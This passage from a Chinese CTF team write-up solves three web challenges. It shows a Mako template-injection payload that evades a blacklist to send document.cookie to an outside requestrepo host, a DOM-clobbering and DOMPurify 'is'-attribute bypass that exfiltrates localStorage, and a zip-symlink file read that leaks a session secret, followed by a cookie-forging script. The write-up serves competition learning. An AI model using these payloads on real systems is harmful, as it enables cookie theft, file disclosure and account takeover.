</span></span></code></pre></td></tr></table></div></div><p>成功！</p><h2 id=kissfixess>KISSFIXESS</h2><blockquote><p>存在模板注入</p></blockquote><p>用户输入在模板编译前被替换到模板源码中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>render_page</span><span class=p>(</span><span class=n>name_to_display</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Renders the HTML page with the given name.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>templ</span> <span class=o>=</span> <span class=n>html_template</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;NAME&#34;</span><span class=p>,</span> <span class=n>escape_html</span><span class=p>(</span><span class=n>name_to_display</span> <span class=ow>or</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>template</span> <span class=o>=</span> <span class=n>Template</span><span class=p>(</span><span class=n>templ</span><span class=p>,</span> <span class=n>lookup</span><span class=o>=</span><span class=n>lookup</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>template</span><span class=o>.</span><span class=n>render</span><span class=p>(</span><span class=n>name_to_display</span><span class=o>=</span><span class=n>name_to_display</span><span class=p>,</span> <span class=n>banned</span><span class=o>=</span><span class=s2>&#34;&amp;&lt;&gt;()&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>这里 <code>html_template</code> 是 Mako 模板源码字符串。将用户输入替换进 &ldquo;NAME&rdquo; 占位符发生在 Template(&mldr;) 编译之前。</li><li>Mako 会在编译阶段解析 ${&mldr;}（表达式）与以 % 开头的控制行（如 % if &mldr;:、% for &mldr;:）。</li></ul><blockquote><p>这些字符会在这之前被转义,意味着模板不会直接执行他们</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>escape_html</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;转义HTML特殊字符，防止XSS等攻击&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span> <span class=s2>&#34;&amp;amp;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&lt;&#34;</span><span class=p>,</span> <span class=s2>&#34;&amp;lt;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;&amp;gt;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;(&#34;</span><span class=p>,</span> <span class=s2>&#34;&amp;#40;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;)&#34;</span><span class=p>,</span> <span class=s2>&#34;&amp;#41;&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>黑名单如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>banned</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;(&#34;</span><span class=p>,</span> <span class=s2>&#34;)&#34;</span><span class=p>,</span> <span class=s2>&#34;self&#34;</span><span class=p>,</span> <span class=s2>&#34;_&#34;</span><span class=p>,</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;import&#34;</span><span class=p>,</span> <span class=s2>&#34;eval&#34;</span><span class=p>,</span> <span class=s2>&#34;exec&#34;</span><span class=p>,</span> <span class=s2>&#34;os&#34;</span><span class=p>,</span> <span class=s2>&#34;;&#34;</span><span class=p>,</span> <span class=s2>&#34;,&#34;</span><span class=p>,</span> <span class=s2>&#34;|&#34;</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>但是似乎转义后的字符能带来 & a m p ; l t g t # 4 0 1 , 这似乎有助于我们绕过waf</p><p>发现band被传进去了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>banned=&#34;&amp;&lt;&gt;()&#34;
</span></span></code></pre></td></tr></table></div></div><p>尝试构造如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>$</span><span class=p>{</span><span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>60</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span> <span class=o>%</span> <span class=mi>115</span> <span class=o>+</span><span class=s1>&#39;cript&#39;</span> <span class=o>+</span> <span class=nx>banned</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;fetch&#39;</span> <span class=o>+</span> <span class=nx>banned</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;`http&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>115</span> <span class=o>+</span> <span class=s1>&#39;://drzgmowg&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>46</span> <span class=o>+</span> <span class=s1>&#39;reque&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>115</span> <span class=o>+</span> <span class=s1>&#39;trepo&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>46</span> <span class=o>+</span> <span class=s1>&#39;com/?a=&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span> <span class=o>%</span> <span class=mi>36</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>123</span> <span class=o>+</span> <span class=s1>&#39;document&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>46</span> <span class=o>+</span> <span class=s1>&#39;cookie&#39;</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span> <span class=o>%</span> <span class=mi>125</span> <span class=o>+</span> <span class=s1>&#39;`&#39;</span> <span class=o>+</span> <span class=nx>banned</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span><span class=o>%</span><span class=mi>60</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span> <span class=o>%</span> <span class=mi>47</span> <span class=o>+</span> <span class=s1>&#39;%c&#39;</span> <span class=o>%</span> <span class=mi>115</span> <span class=o>+</span><span class=s1>&#39;cript&#39;</span> <span class=o>+</span> <span class=nx>banned</span><span class=p>[</span><span class=mi>2</span><span class=p>]}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=dom-notify>DOM NOTIFY</h2><p>可能是DOM破坏?</p><p><a href=https://portswigger.net/web-security/dom-based/dom-clobbering>DOM clobbering | Web Security Academy</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>a</span> <span class=nx>id</span><span class=o>=</span><span class=nx>custom_elements</span><span class=o>&gt;&lt;</span><span class=nx>a</span> <span class=nx>id</span><span class=o>=</span><span class=nx>custom_elements</span> <span class=nx>name</span><span class=o>=</span><span class=nx>enabled</span><span class=o>&gt;&lt;</span><span class=nx>a</span> <span class=nx>id</span><span class=o>=</span><span class=nx>custom_elements</span> <span class=nx>name</span><span class=o>=</span><span class=nx>endpoint</span> <span class=nx>href</span><span class=o>=</span><span class=c1>//kws1oh3y.requestrepo.com&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>很好,我们现在能向任意网站获得数据了,我们继续</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=o>:</span><span class=s2>&#34;title-div&#34;</span><span class=p>,</span><span class=s2>&#34;observedAttribute&#34;</span><span class=o>:</span><span class=s2>&#34;data-id&#34;</span><span class=p>}]</span>
</span></span></code></pre></td></tr></table></div></div><p>如果我们监听这种全局属性性呢？<a href=https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Global_attributes/data-*>data-*</a></p><p>我发现DOMPurify认为data-id与id都是被允许的,不会删除此属性!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>ALLOWED_ATTR</span><span class=o>:</span> <span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;class&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>,</span> <span class=s1>&#39;href&#39;</span><span class=p>,</span> <span class=s1>&#39;title&#39;</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p><a href=https://jorianwoltjer.com/blog/p/research/mutation-xss>突变 XSS：解释、CVE 和挑战 |乔里安·沃尔特杰</a></p><blockquote><p>因为特殊原因 DOMPurify 在有些情况无法清理is属性？</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=new DOMParser().parseFromString(&#39;&lt;a is=&#34;to-delete&#34;&gt;&#39;, &#34;text/html&#34;);
</span></span><span class=line><span class=cl>a.body.firstChild.removeAttribute(&#34;is&#34;);
</span></span><span class=line><span class=cl>a.getRootNode().body.firstChild;
</span></span><span class=line><span class=cl>&gt;&gt;&gt; &lt;a&gt;&lt;/a&gt;
</span></span><span class=line><span class=cl>a.getRootNode().body.firstChild.outerHTML;
</span></span><span class=line><span class=cl>&gt;&gt;&gt; &#39;&lt;a is=&#34;to-delete&#34;&gt;&lt;/a&gt;&#39;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;div is=&gt;&lt;/div&gt;
</span></span></code></pre></td></tr></table></div></div><p>is成功成为了invalid-value</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>[{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;invalid-value&#34;</span><span class=p>,</span><span class=nt>&#34;observedAttribute&#34;</span><span class=p>:</span><span class=s2>&#34;data-class&#34;</span><span class=p>}]</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>div</span> <span class=nx>data</span><span class=o>-</span><span class=kr>class</span><span class=o>=</span><span class=nx>some</span> <span class=nx>is</span><span class=o>=</span> <span class=o>&gt;&lt;</span><span class=err>/div&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>成功了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>div</span> <span class=nx>is</span><span class=o>=</span><span class=s2>&#34;invalid-value&#34;</span> <span class=nx>data</span><span class=o>-</span><span class=kr>class</span><span class=o>=</span><span class=s2>&#34;some&#34;</span><span class=o>&gt;&lt;</span><span class=err>/div&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>a</span> <span class=nx>id</span><span class=o>=</span><span class=nx>custom_elements</span><span class=o>&gt;&lt;</span><span class=nx>a</span> <span class=nx>id</span><span class=o>=</span><span class=nx>custom_elements</span> <span class=nx>name</span><span class=o>=</span><span class=nx>enabled</span><span class=o>&gt;&lt;</span><span class=nx>a</span> <span class=nx>id</span><span class=o>=</span><span class=nx>custom_elements</span> <span class=nx>name</span><span class=o>=</span><span class=nx>endpoint</span> <span class=nx>href</span><span class=o>=</span><span class=c1>//kws1oh3y.requestrepo.com&gt;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>div</span> <span class=nx>data</span><span class=o>-</span><span class=kr>class</span><span class=o>=</span><span class=s2>&#34;&#39;);fetch(&#39;https://kws1oh3y.requestrepo.com/?flag=&#39;+localStorage.getItem(&#39;flag&#39;))&lt;!--&#34;</span> <span class=nx>is</span><span class=p>=&gt;</span><span class=o>&lt;</span><span class=err>/div&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=slippy>SLIPPY</h2><p>有 <code>/upload</code> 上传接口，且上传后的zip文件会被解压，并可以在 <code>/files</code> 下载解压后的文件</p><p>通过将符号链接加到zip文件中可以绕过路径限制读取任意文件</p><p>构造zip文件读取远程靶机的 <code>server.js</code> 和 <code>.env</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir app
</span></span><span class=line><span class=cl>mkdir app/uploads
</span></span><span class=line><span class=cl>mkdir app/uploads/1
</span></span><span class=line><span class=cl>touch app/server.js
</span></span><span class=line><span class=cl>touch app/.env
</span></span><span class=line><span class=cl><span class=nb>cd</span> app/uploads/1
</span></span><span class=line><span class=cl>ln -s ../../server.js ./server
</span></span><span class=line><span class=cl>ln -s ../../.env ./env
</span></span><span class=line><span class=cl>zip -y 1.zip ./server ./env
</span></span></code></pre></td></tr></table></div></div><p>下载 <code>server</code> 和 <code>env</code> 两个文件，获取到 develop 用户的 <code>sid</code> 是 <code>amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E</code> ，以及 <code>SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code></p><p>用下面的脚本伪造 develop 的 cookie</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>signature</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;cookie-signature&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>secret</span> <span class=o>=</span> <span class=s2>&#34;3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>sid</span> <span class=o>=</span> <span class=s2>&#34;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>cookieVal</span> <span class=o>=</span> <span class=s1>&#39;s:&#39;</span> <span class=o>+</span> <span class=nx>signature</span><span class=p>.</span><span class=nx>sign</span><span class=p>(</span><span class=nx>sid</span><span class=p>,</span> <span class=nx>secret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;connect.sid=&#34;</span> <span class=o>+</span> <span class=nx>cookieVal</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>connect.sid=s%3AamwvsLiDgNHm2XXfoynBUNRA2iWoEH5E%2ER3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE</p></blockquote><p>修改 cookie ，添加请求头 <code>X-Forwarded-For: 127.0.0.1</code> ，访问 <code>/debug/files?session_id=../../</code></p><p>得到 flag 在 <code>/tlhedn6f</code> 路径下</p><p>构造 zip ，加入 <code>../../../tlhedn6f/flag.txt</code> 的符号链接</p><p>上传zip文件后下载 flag.txt</p><div class=blog-tags><a href=https://su-team.cn/tags/otherctf/>OtherCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/zer0ptsctf-2023-su-wu/>2023 Zer0ptsCTF SU Writeup</a></li><li><a href=/post/xhlj-2021-su-wu/>2021年西湖论剑线上赛 SU Write-up</a></li><li><a href=/post/gxzyctf-2020-su-wu/>高校战“疫”网络安全分享赛 2020 SU Write Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/l3hctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 L3HCTF SU WriteUp">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/wmctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 WMCTF SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>